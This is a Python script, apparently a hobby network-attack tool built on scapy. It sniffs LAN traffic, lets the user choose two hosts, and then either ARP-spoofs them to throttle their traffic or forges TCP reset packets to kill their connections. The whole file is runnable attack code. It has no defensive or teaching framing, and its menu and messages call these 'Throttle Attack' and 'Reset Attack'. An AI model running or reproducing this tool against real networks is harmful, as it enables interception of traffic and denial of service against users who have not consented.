#!/usr/bin/env python

from ctypes import sizeof
from datetime import datetime
from socket import *
from struct import *
import sys
from typing import Counter, Sequence
from scapy import sessions
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
import time
import re


def contains_192(s):
    if ("192." in s):
        return s

def _input(message, input_type=int):
    while True:
        try:
                return input_type (input(message))
        except:pass

def cleanlist(listof, filter):
    retList = []
 
    for x in listof:
        rSuffix = x.replace(':', ' ').replace('>', ' ').split()
        for y in rSuffix:
            if(filter == ''):
                if ('.' in y):
                    if (y in retList):
                        pass
                    else:
                        retList.append(y)  
            else:
                if(filter in y):
                    if (y in retList):
                        pass
                    else:
                        retList.append(y)
    return retList

def GetList(filter):

    if(filter == ''):
        packet = scapy.sniff(session=sessions.IPSession, prn=lambda x: x.summary(), count=50)
    else:
        packet = scapy.sniff(filter=filter,
        session=sessions.IPSession, prn=lambda x: x.summary(),
        count=100)

    return packet

def SearchIP(SearchFilter, packet):
    ListOfIP = []
    retList = []

    if(SearchFilter == ''):
        for x in range(0,50):
            if('.' in packet[x][1].getlayer(IP).summary()):
                AddThis = str(packet[x][1].getlayer(IP).summary())
                ListOfIP.append(AddThis)
    else:
        for x in range(0,100):
            if (SearchFilter in packet[x][1].getlayer(IP).summary()):
                AddThis = str(packet[x][1].getlayer(IP).summary())
                ListOfIP.append(AddThis)
    
    retList = cleanlist(ListOfIP, SearchFilter)
        
    return retList

def ChooseIP(IPList):
    i = 0
    j = 0
    src = 0
    dst = 0
    valsrc = None
    valdst = None
    n = len(IPList)
    while not input("Enter to Continue \n"):
        print("IP adresses:")
        for x in IPList:
            i += 1
            print("[{}] ".format(i) + x)
        try:
            while True:
                valsrc = _input("Choose Source\n")
                if valsrc <= n and n>0:
                    src = IPList[valsrc-1]
                    IPList.pop(valsrc-1)
                    break
                else:
                    print("Choice was not allowed")
                    i=0
                    print("IP adresses:")
                    for x in IPList:
                        i += 1
                        print("[{}] ".format(i) + x)
                    pass
                    
            for l in IPList:
                j += 1
                print("[{}] ".format(j) + l)

            while True:
                if IPList:
                    valdst = _input("Choose Destination\n")
                    if valdst <= n-1 and valdst > 0:
                        dst = IPList[valdst-1]
                        break
                    else:
                        print("Choice was not allowed")
                        j=0
                        print("IP adresses:")
                        for y in IPList:
                            j += 1
                            print("[{}] ".format(j) + y)
                        pass
                else:
                    print("There is no destination to choose\nWill now exit")
                    sys.exit()
        except KeyboardInterrupt:
            print("\n Exitting Program !!!!")
            sys.exit()
        break

    print("This is src {}".format(src))
    print("This is dst {}".format(dst))
    return src, dst

def get_mac(ip):
    # Create arp packet object. pdst - destination host ip address
    arp_request = scapy.ARP(pdst=ip)
    # Create ether packet object. dst - broadcast mac address. 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine two packets in two one
    arp_request_broadcast = broadcast/arp_request
    # Get list with answered hosts
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    # Return host mac address
    return answered_list[0][1].hwsrc

def restore(target_ip, host_ip, verbose=True):
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # Send Restore message
    scapy.send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac)) 

def spoof_delay(target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # ARP response
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    verbose=0
    for x in range(1,4):
        print("{}. Package sent".format(x))
        scapy.send(arp_response, verbose)
        time.sleep(1)

    # verbose = 0 means that we send the packet without printing any thing
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def spoof_Cancel(host_ip):
    win=512
    tcp_rst_count = 10

    #Sniffing for packet specific to ip
    t = scapy.sniff(count=20,
          lfilter=lambda x: x.haslayer(TCP)
          and x[IP].src == host_ip)

    # Setting TCP header
    t = t[0]
    tcpdata = {
        'src': t[IP].src,
        'dst': t[IP].dst,
        'sport': t[TCP].sport,
        'dport': t[TCP].dport,
        'seq': t[TCP].seq,
        'ack': t[TCP].ack
    }

    #setting sequence numbers
    max_seq = tcpdata['ack'] + tcp_rst_count * win
    seqs = range(tcpdata['ack'], max_seq, int(win / 2))

    # Setting IP Header
    p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
                TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
                flags="R", window=win, seq=seqs[0])

    #Sending reset attack for each sequence number
    for seq in seqs:
        p.seq = seq
        scapy.send(p, verbose=0)

def throttleFromIP(source, dest):
    try:
        while True:
            spoof_delay(dest, source, verbose=True)
            spoof_delay(source, dest, verbose=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Cancelling Throttle Attack")
        restore(dest, source)
        restore(source, dest)

def cancelConnection(source, dest):
    try:
        while True:
            spoof_Cancel(source)
            spoof_Cancel(dest)
            time.sleep(1)
    except:
        print("\nAttempting to Cancel Reset Attack")
        sys.exit()

def main():

    print("Getting List\n")
    # Sniffing part
    ProtocolFilter = input("If you wish to filter protocols, type what should be searched for\n")
    SniffList = GetList(ProtocolFilter)
    AddressFilter = input("If you wish to filter Addresses, type what should be searched for\n")
    IPList = SearchIP(AddressFilter, SniffList)
    src, dst = ChooseIP(IPList)

    # Adding Timestamp for attack start
    print("Current Time: ", datetime.now())
    try:
        choice = _input("Press 1 for Throttle Attack\nPress 2 for Reset Attack\n")
        if (choice == 1):
            print("Trying to throttle connection")
            throttleFromIP(src,dst)
            print("Great success")
        if (choice == 2):
            print("Trying to cancel Connection")
            cancelConnection(src, dst)
    except:
        print("\n Exitting Program !!!!")
        sys.exit()

    print("end")



if __name__ == "__main__":
    main()
